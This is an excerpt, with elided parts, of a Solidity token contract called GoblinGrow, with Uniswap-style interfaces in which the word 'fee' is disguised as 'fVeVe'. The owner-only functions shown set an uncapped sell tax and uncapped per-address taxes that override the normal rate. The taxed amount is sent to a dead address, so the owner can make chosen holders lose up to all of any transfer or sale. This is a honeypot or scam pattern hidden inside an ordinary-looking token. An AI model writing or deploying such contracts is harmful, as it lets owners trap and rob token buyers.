...
interface IUniswapV2Factory {
    ...
    function fVeVeTo() external view returns (address);
    function fVeVeToSetter() external view returns (address);
    ...
    function setfVeVeTo(address) external;
    function setfVeVeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfVeVeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfVeVeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfVeVeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfVeVeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfVeVeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract GoblinGrow is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfVeVe = 0;

    uint256 private _defaultBuyfVeVe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfVeVe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfVeVe = _value;
    }

    function setSlipfVeVe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfVeVe[_address] = _value;
    }

    function getSlipfVeVe(address _address) external view onlyownar returns (uint256) {
        return _slipfVeVe[_address];
    }


    function setMAccountfVeVe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfVeVe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefVeVeAmount = 0;

        if (rF) {
            uint256 tradefVeVe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefVeVe = _defaultSellfVeVe;
                }
                if (from == uniswapV2Pair) {

                    tradefVeVe = _defaultBuyfVeVe;
                }
            }
            if (_slipfVeVe[from] > 0) {
                tradefVeVe = _slipfVeVe[from];
            }

            tradefVeVeAmount = _Amount.mul(tradefVeVe).div(100);
        }


        if (tradefVeVeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefVeVeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefVeVeAmount);
            emit Transfer(from, _deadAddress, tradefVeVeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefVeVeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefVeVeAmount);
        emit Transfer(from, _to, _Amount - tradefVeVeAmount);
    }
